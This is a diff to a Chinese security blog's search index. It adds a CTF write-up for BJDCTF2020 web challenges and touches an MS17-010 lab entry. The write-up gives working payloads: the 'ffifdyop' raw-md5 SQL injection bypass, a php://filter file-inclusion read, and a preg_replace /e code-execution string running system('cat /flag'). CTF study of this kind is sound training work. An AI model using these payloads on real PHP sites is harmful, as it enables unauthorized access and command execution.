@@ -1102,7 +1102,9 @@ E#---
   <entry>
     <title>网安作业</title>
     <url>/2020/09/27/homework/</url>
-    <content><![CDATA[<h1 id="MS17-010"><a href="#MS17-010" class="headerlink" title="MS17-010"></a>MS17-010</h1><h2 id="1-准备工作"><a href="#1-准备工作" class="headerlink" title="1.准备工作"></a>1.准备工作</h2><p>开启两台虚拟机，一台kali作为攻击方，一台win7作为被攻击方</p>
+    <content><![CDATA[<h1 id="MS17-010"><a href="#MS17-010" class="headerlink" title="MS17-010"></a>MS17-010</h1><a id="more"></a>
+
+<h2 id="1-准备工作"><a href="#1-准备工作" class="headerlink" title="1.准备工作"></a>1.准备工作</h2><p>开启两台虚拟机，一台kali作为攻击方，一台win7作为被攻击方</p>
 <p>将两台虚拟机桥接到同一网卡，并保证能够通信</p>
 <p>Kali IP 10.1.1.1  255.0.0.0  win7 IP　10.1.1.2  255.0.0.0</p>
 <p>测试两台主机之间的通信情况</p>
@@ -1162,6 +1164,54 @@ E#---
       </categories>
       <tags>
         <tag>msf</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>BJDCTF2020</title>
+    <url>/2020/09/28/BJDCTF2020/</url>
+    <content><![CDATA[<h1 id="BJDCTF-web"><a href="#BJDCTF-web" class="headerlink" title="BJDCTF-web"></a>BJDCTF-web</h1><a id="more"></a>
+
+<h2 id="easy-md5"><a href="#easy-md5" class="headerlink" title="easy md5"></a>easy md5</h2><p>F12看到了提示，给出了sql语句</p>
+<p><img src="/2020/09/28/BJDCTF2020/md5-1.png" alt></p>
+<figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line">Hint: <span class="keyword">select</span> * <span class="keyword">from</span> <span class="string">'admin'</span> <span class="keyword">where</span> <span class="keyword">password</span>=md5($pass,<span class="keyword">true</span>)</span><br></pre></td></tr></table></figure>
+
+<p>这里是将输入的密码进行了一次md5的加密</p>
+<p><strong>md5()函数介绍</strong></p>
+<p><img src="/2020/09/28/BJDCTF2020/md5.png" alt></p>
+<p>这里的参数raw=true ，所以是将我们输入的密码加密16字符二进制格式，如果想完成注入，则md5值经过hex转成字符串后为 ‘or’…….这样的字符串，只要出现了or，且or后面的值为真即可完成注入。</p>
+<p><code>select * from &#39;admin&#39; where password=&#39; or &#39;sdaa</code></p>
+<p>这里经常使用的字符串是<strong>ffifdyop</strong>，该字符串md5加密后若raw参数为True时会返回 <strong>‘or’6&lt;trash&gt;</strong> (&lt;trash&gt;其实就是一些乱码和不可见字符，这里只要第一位是非零数字即可被判定为True，后面的&lt;trash&gt;会在MySQL将其转换成整型比较时丢掉)</p>
+<p>查询语句为</p>
+<p><code>select * from &#39;admin&#39; where password=&#39;or&#39;6&lt;trash&gt;&#39;</code>此查询语句结果为真</p>
+<p>提交 ffifdyop后会跳转到另外的页面，查看源码</p>
+<p><img src="/2020/09/28/BJDCTF2020/md5-2.png" alt></p>
+<p>这里直接利用md5()函数不能处理数组的特性，get提交 <code>?a[]=1&amp;b[]=2</code></p>
+<p>接下来还有一次跳转，直接post <code>param1[]=1&amp;param2[]=2</code>，拿到flag</p>
+<p><img src="/2020/09/28/BJDCTF2020/mdd5-3.png" alt></p>
+<h2 id="不过如此"><a href="#不过如此" class="headerlink" title="不过如此"></a>不过如此</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">$text = $_GET[<span class="string">"text"</span>]; <span class="comment">//get 获取一个参数text 使用data伪协议</span></span><br><span class="line">$file = $_GET[<span class="string">"file"</span>]; <span class="comment">//file参数，这里可以使用filter伪协议读取php页面源码</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($text)&amp;&amp;(file_get_contents($text,<span class="string">'r'</span>)===<span class="string">"I have a dream"</span>))&#123;  <span class="comment">//text 的内容位I have a dream</span></span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"&lt;br&gt;&lt;h1&gt;"</span>.file_get_contents($text,<span class="string">'r'</span>).<span class="string">"&lt;/h1&gt;&lt;/br&gt;"</span>;</span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">"/flag/"</span>,$file))&#123;                              <span class="comment">//file参数不能包含flag</span></span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"Not now!"</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">include</span>($file); <span class="comment">//next.php 提示了下一个页面的名字 </span></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">  highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>看到了file参数，想到了文件包含的漏洞利用于是构造以下的payload:</p>
+<p><code>?text=data://text/plain,I%20have%20a%20dream&amp;file=php://filter/read/convert.base64-encode/resource=next.php</code></p>
+<p>对到了index.php页面的base64源码，解码后如下</p>
+<p>index.php</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$id = $_GET[<span class="string">'id'</span>];</span><br><span class="line">$_SESSION[<span class="string">'id'</span>] = $id;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">complex</span><span class="params">($re, $str)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> preg_replace(</span><br><span class="line">        <span class="string">'/('</span> . $re . <span class="string">')/ei'</span>,</span><br><span class="line">        <span class="string">'strtolower("\\1")'</span>,</span><br><span class="line">        $str</span><br><span class="line">    );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>($_GET <span class="keyword">as</span> $re =&gt; $str) &#123;</span><br><span class="line">    <span class="keyword">echo</span> complex($re, $str). <span class="string">"\n"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getFlag</span><span class="params">()</span></span>&#123;</span><br><span class="line">	@<span class="keyword">eval</span>($_GET[<span class="string">'cmd'</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>利用<strong>preg_replace()使用的/e模式可以存在远程执行代码</strong></p>
+<p>在next.php在输入</p>
+<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line"><span class="keyword">next</span>.php?\S*=<span class="variable">$&#123;getFlag()&#125;</span>&amp;cmd=system(<span class="string">"cat /flag"</span>);</span><br></pre></td></tr></table></figure>
+
+
+
+<p><a href="https://segmentfault.com/a/1190000018991087" target="_blank" rel="noopener">php伪协议</a></p>
+<p><a href="https://xz.aliyun.com/t/2557" target="_blank" rel="noopener">preg_replace /e模式漏洞详解</a></p>
+]]></content>
+      <categories>
+        <category>ctf</category>
+      </categories>
+      <tags>
+        <tag>sql</tag>
+        <tag>md5</tag>
+        <tag>php伪协议</tag>
       </tags>
   </entry>
 </search>
